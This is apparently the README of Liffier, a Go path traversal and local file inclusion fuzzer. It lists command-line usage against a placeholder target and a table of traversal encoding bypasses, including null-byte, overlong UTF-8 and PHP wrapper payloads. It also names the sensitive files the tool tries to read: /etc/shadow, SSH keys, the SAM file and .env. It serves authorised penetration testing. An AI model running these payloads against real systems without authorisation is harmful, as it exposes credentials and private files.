# Liffier

Path traversal / LFI fuzzer written in Go. 66 encoding bypass techniques, automatic response analysis, concurrent goroutines, proxy support, wordlist input, and payload generation.

Single static binary. No runtime dependencies.

## Install

```bash
go install github.com/momenbasel/liffier/cmd/liffier@latest
```

Or build from source:

```bash
git clone https://github.com/momenbasel/liffier.git
cd liffier
go build -o liffier ./cmd/liffier/
```

## Usage

### Fuzz a URL for path traversal

```bash
# Default: test /etc/passwd with all 66 encodings, depth 1-10
liffier fuzz "https://target.com/page?file="

# Custom file, 15 depth levels, 100 concurrent workers
liffier fuzz "https://target.com/page?file=" -f /etc/shadow -d 15 -w 100

# With proxy (Burp/Caido)
liffier fuzz "https://target.com/page?file=" -x http://127.0.0.1:8080

# Authenticated
liffier fuzz "https://target.com/page?file=" -c "session=abc123" -H "Authorization: Bearer token"

# Enable null-byte and extension bypass suffixes
liffier fuzz "https://target.com/page?file=" --bypass

# Specific encodings only
liffier fuzz "https://target.com/page?file=" -e plain -e url-encoded -e double-url -e overlong-slash-2byte
```

### Fuzz with a wordlist of target files

```bash
# Test every file in the wordlist against the URL
liffier fuzz "https://target.com/page?file=" -l wordlists/linux.txt

# Combine with high concurrency
liffier fuzz "https://target.com/page?file=" -l wordlists/webapp.txt -w 200 --bypass

# Windows targets
liffier fuzz "https://target.com/page?file=" -l wordlists/windows.txt
```

### Quick scan (multiple common files)

```bash
# Tests passwd, shadow, hosts, environ, win.ini, .env, .git, wp-config, etc.
liffier scan "https://target.com/page?file="
```

### Generate payloads (pipe to other tools)

```bash
# Pipe to ffuf
liffier payloads -f /etc/passwd | ffuf -u "https://target/file=FUZZ" -w -

# With bypass suffixes
liffier payloads -f /etc/passwd --bypass > payloads.txt

# From wordlist
liffier payloads -l wordlists/linux.txt -d 5 -e url-encoded
```

### List encodings

```bash
liffier encodings
```

### Export results

```bash
liffier fuzz "https://target.com/page?file=" -o results.json
liffier fuzz "https://target.com/page?file=" -o results.csv --format csv
liffier fuzz "https://target.com/page?file=" -o results.jsonl --format jsonl

# Only export hits
liffier fuzz "https://target.com/page?file=" -o hits.json --hits-only
```

## Encoding Techniques (66)

Categories:

| Category | Count | Examples |
|---|---|---|
| Basic | 3 | `../`, `..\`, `..//` |
| URL encoded (single) | 5 | `..%2f`, `%2e%2e%2f`, `..%5c` |
| URL encoded (double) | 4 | `..%252f`, `%252e%252e%252f` |
| URL encoded (triple) | 2 | `..%25252f` |
| Overlong UTF-8 | 7 | `..%c0%af`, `..%e0%80%af`, `..%c1%9c` |
| Unicode/fullwidth | 5 | `..%ef%bc%8f`, `%ef%bc%8e%ef%bc%8e%ef%bc%8f` |
| Null byte | 3 | `../%00`, `..%00/`, `.%00./` |
| Filter evasion | 6 | `....//`, `.../.../`, `./../` |
| IIS specific | 5 | `..%u002f`, `..%u2215`, `..%%35c` |
| Java/Tomcat | 5 | `..;/`, `..;foo=bar/`, `/./../` |
| PHP wrappers | 6 | `php://filter/...`, `data://...`, `expect://` |
| WAF bypass | 5 | tab/CR/LF/space injection, `..+/` |
| Case variation | 3 | `..%2F`, `%2E%2E/` |
| Mixed/other | 7 | `..\\/`, `../\`, long UTF-8 padding |

Run `liffier encodings` for the full list.

## Detection

Not just status code checking. Liffier:

1. Sends a baseline request (known-bad path) and records response length
2. Matches response bodies against file-specific signatures (`root:x:0:0:` for passwd, `[fonts]` for win.ini, etc.)
3. Pattern-matches for error pages (404, 403, 500 text)
4. Compares response length against baseline - flags anomalies (>30% difference)
5. Assigns confidence: **HIGH** (signature), **MEDIUM** (structural), **LOW** (length anomaly)

## Performance

Go goroutines with no upper limit on `-w`. Default is 10 workers. For aggressive scanning:

```bash
# 500 concurrent goroutines
liffier fuzz "https://target.com/page?file=" -w 500

# With rate limiting (100ms between launches)
liffier fuzz "https://target.com/page?file=" -w 500 --delay 100
```

## Wordlists

Included in `wordlists/`:

- `linux.txt` - /etc/passwd, /proc/*, logs, SSH keys, configs
- `windows.txt` - win.ini, SAM, SYSTEM, IIS configs
- `webapp.txt` - .env, wp-config.php, .git/config, web.xml

## License

MIT

## Disclaimer

For authorized security testing and research only.
